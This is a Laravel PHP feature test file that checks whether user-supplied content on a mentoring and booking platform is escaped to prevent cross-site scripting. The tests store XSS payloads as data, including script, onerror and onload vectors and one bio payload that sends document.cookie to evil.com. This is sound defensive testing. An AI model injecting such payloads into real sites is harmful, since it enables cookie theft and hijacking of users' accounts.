<?php

namespace Tests\Feature\Security;

use App\Models\Booking;
use App\Models\Gig;
use App\Models\MentorProfile;
use App\Models\Review;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * XSS (Cross-Site Scripting) & Output Escaping Tests.
 *
 * Validates that user-supplied content containing <script> tags,
 * HTML entities, and JavaScript event handlers is properly escaped
 * before rendering, preventing reflected and stored XSS.
 *
 * Tests cover:
 * - Gig titles and descriptions
 * - Booking notes and freelancer notes
 * - Review comments
 * - User bio and profile fields
 */
class XssEscapeTest extends TestCase
{
    use RefreshDatabase;

    private const XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(document.cookie)</script>',
        "';alert(String.fromCharCode(88,83,83))//",
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
    ];

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private function makeMentor(): User
    {
        $m = User::factory()->mentor()->approved()->create();
        MentorProfile::factory()->verified()->create(['user_id' => $m->id]);
        return $m;
    }

    private function makeFreelancer(): User
    {
        return User::factory()->freelancer()->approved()->create();
    }

    // ─── Review Comment XSS ───────────────────────────────────────────────────

    /** @test */
    public function xss_payload_in_review_comment_is_escaped_in_rendered_output(): void
    {
        $mentor     = $this->makeMentor();
        $freelancer = $this->makeFreelancer();
        $gig        = Gig::factory()->published()->forMentor($mentor)->withDuration(60)->create();

        $booking = Booking::factory()
            ->completed()
            ->between($freelancer, $mentor, $gig)
            ->create();

        $xssPayload = '<script>alert("XSS")</script>';

        $this->actingAs($freelancer)
             ->post(route('bookings.review', $booking), [
                 'booking_id' => $booking->id,
                 'rating'  => 4,
                 'comment' => $xssPayload,
             ]);

        // Fetch the booking detail page as the mentor
        $response = $this->actingAs($mentor)
                         ->get(route('mentor.bookings.show', $booking));

        $response->assertStatus(200);

        // The raw script tag should NOT appear in rendered output
        $response->assertDontSee('<script>alert("XSS")</script>', false);

        // But the escaped version SHOULD be in the HTML (Blade auto-escapes {{ }})
        $response->assertSee('&lt;script&gt;', false);
    }

    /** @test */
    public function xss_in_booking_note_is_escaped_in_rendered_output(): void
    {
        $mentor     = $this->makeMentor();
        $freelancer = $this->makeFreelancer();
        $gig        = Gig::factory()->published()->forMentor($mentor)->withDuration(60)->create();

        $booking = Booking::factory()
            ->requested()
            ->between($freelancer, $mentor, $gig)
            ->create([
                'proposed_date' => now()->addDays(3)->toDateString(),
                'proposed_time' => '10:00',
            ]);

        $xssPayload = '<img src=x onerror=alert(document.cookie)>';

        $this->actingAs($freelancer)
             ->post(route('bookings.storeNote', $booking), [
                 'note' => $xssPayload,
             ]);

        $response = $this->actingAs($mentor)
                         ->get(route('mentor.bookings.show', $booking));

        $response->assertStatus(200);
        $response->assertDontSee('<img src=x onerror=alert(document.cookie)>', false);
    }

    /** @test */
    public function xss_in_gig_title_is_stored_as_text_and_escaped_on_render(): void
    {
        $mentor = $this->makeMentor();
        $xssPayload = '<script>alert("gig XSS")</script>';

        // Store it directly as a gig title (bypassing validation for testing purposes)
        $gig = Gig::factory()->published()->forMentor($mentor)->create([
            'title' => $xssPayload,
        ]);

        $freelancer = $this->makeFreelancer();

        $response = $this->actingAs($freelancer)
                         ->get(route('gigs.index'));

        $response->assertStatus(200);
        $response->assertDontSee('<script>alert("gig XSS")</script>', false);
    }

    /** @test */
    public function xss_in_user_bio_is_escaped_on_profile_view(): void
    {
        $xssPayload = "<script>window.location='http://evil.com?c='+document.cookie</script>";

        $freelancer = User::factory()->freelancer()->approved()->create([
            'bio' => $xssPayload,
        ]);

        $admin = User::factory()->admin()->create();

        $response = $this->actingAs($admin)
                         ->get(route('admin.users.show', $freelancer));

        $response->assertStatus(200);
        $response->assertDontSee("<script>window.location=", false);
    }

    // ─── Multi-Payload Data Provider Test ─────────────────────────────────────

    /**
     * @test
     * @dataProvider xssPayloads
     */
    public function multiple_xss_payloads_in_review_comment_are_all_escaped(string $payload): void
    {
        $mentor     = $this->makeMentor();
        $freelancer = $this->makeFreelancer();
        $gig        = Gig::factory()->published()->forMentor($mentor)->withDuration(60)->create();

        $booking = Booking::factory()
            ->completed()
            ->between($freelancer, $mentor, $gig)
            ->create();

        $this->actingAs($freelancer)
             ->post(route('bookings.review', $booking), [
                 'booking_id' => $booking->id,
                 'rating'  => 3,
                 'comment' => $payload,
             ]);

        $response = $this->actingAs($mentor)
                         ->get(route('mentor.bookings.show', $booking));

        $responseContent = $response->getContent();
        // Verify the raw dangerous payload does not appear unescaped anywhere in the HTML
        $this->assertStringNotContainsString($payload, $responseContent, "XSS payload '{$payload}' was rendered unescaped in response.");
    }

    public static function xssPayloads(): array
    {
        return array_map(fn ($p) => [$p], self::XSS_PAYLOADS);
    }

    // ─── Review Comment Input Validation ─────────────────────────────────────

    /** @test */
    public function review_comment_with_only_script_tag_is_accepted_but_escaped(): void
    {
        // Blade auto-escapes via {{ $comment }}, so it should be stored
        // but rendered safely. We verify it's stored and not rejected.
        $mentor     = $this->makeMentor();
        $freelancer = $this->makeFreelancer();
        $gig        = Gig::factory()->published()->forMentor($mentor)->withDuration(60)->create();

        $booking = Booking::factory()
            ->completed()
            ->between($freelancer, $mentor, $gig)
            ->create();

        $payload = '<script>alert(1)</script>';

        $this->actingAs($freelancer)
             ->post(route('bookings.review', $booking), [
                 'booking_id' => $booking->id,
                 'rating'  => 5,
                 'comment' => $payload,
             ])
             ->assertSessionHasNoErrors();

        // Stored as raw text
        $this->assertDatabaseHas('reviews', [
            'booking_id' => $booking->id,
            'comment'    => $payload,
        ]);
    }

    // ─── Gig Description XSS (stored) ────────────────────────────────────────

    /** @test */
    public function gig_creation_with_xss_in_description_stores_raw_and_renders_escaped(): void
    {
        $mentor     = $this->makeMentor();
        $freelancer = $this->makeFreelancer();

        // Force store with XSS in description
        $gig = Gig::factory()->published()->forMentor($mentor)->create([
            'description' => '<script>steal(document.cookie)</script> Learn Python',
        ]);

        $response = $this->actingAs($freelancer)
                         ->get(route('gigs.show', $gig->slug));

        $response->assertStatus(200);
        $response->assertDontSee('<script>steal(document.cookie)</script>', false);
    }
}
